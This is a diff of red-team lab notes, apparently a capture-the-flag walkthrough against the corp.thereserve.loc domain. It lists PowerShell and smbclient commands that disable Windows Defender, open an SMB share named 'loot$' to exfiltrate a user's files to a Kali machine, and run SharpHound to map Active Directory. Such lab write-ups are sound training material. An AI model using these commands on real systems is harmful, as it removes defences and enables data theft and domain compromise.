@@ -1,3 +1,5 @@
+After [[CORP Tier 1]].
+
 We are now local administrators of the machine, but in order to be able to fully compromise the Active Directory, we need a Domain Administrator account. 
 
 ## Disable Windows Defender
@@ -6,23 +8,23 @@ We are now local administrators of the machine, but in order to be able to fully
 	`Set-MpPreference -DisableRealtimeMonitoring $true`
 ## Map the Active Directory in Bloodhound
 ### Create a new share folder to exfiltrate information.
-1. On Powershell run:
+1. In order to exfiltrate the information from the machine, create a share folder pointing to the Downloads directory, by issuing the following command on Powershell:
 	 `New-SMBShare -name "loot$" -path "c:\users\laura.wood\Downloads" -FullAccess "laura.wood@corp.thereserve.loc"`
 		Name  ScopeName Path                          Description
 		----  --------- ----                                    -----------
 		loot$ *                      c:\users\laura.wood\Downloads
-2. On your Kali Machine run:
-	`smbclient \\\\10.200.10.22\\loot$ -U laura.wood@corp.thereserve.loc`
+2. Sccess the folder through smbclient and retrieve data from our tools on your Kali Machine run:
+	`smbclient \\\\10.200.X.22\\loot$ -U laura.wood@corp.thereserve.loc`
 		smb: \>
 
 ## Getting loot w/ SharpHound
 ### Upload SharpHound.ps1 from the Kali Machine
-`smb: \>put SharpHound.exe`
+`smb: \>put SharpHound.ps1`
 
 ### Run SharpHound.ps1 on Powershell
 `. .\SharpHound.ps1`
 
-`Invoke-Bloodhound -CollectionMethod All -Domain corp.thereserve.loc
+`Invoke-Bloodhound -CollectionMethod All -Domain corp.thereserve.loc 
 
 > This action will create a zip file.
 
